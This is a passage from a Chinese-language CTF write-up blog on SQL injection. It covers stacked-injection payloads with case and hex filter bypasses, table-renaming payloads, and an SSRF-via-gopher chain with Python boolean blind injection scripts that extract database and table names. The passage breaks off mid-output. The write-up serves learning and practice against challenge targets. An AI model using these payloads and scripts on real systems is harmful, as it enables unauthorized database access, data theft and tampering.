class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/09/SQLI/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/09/SQLI/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/09/SQLI/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/09/SQLI/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/09/SQLI/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/09/SQLI/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span 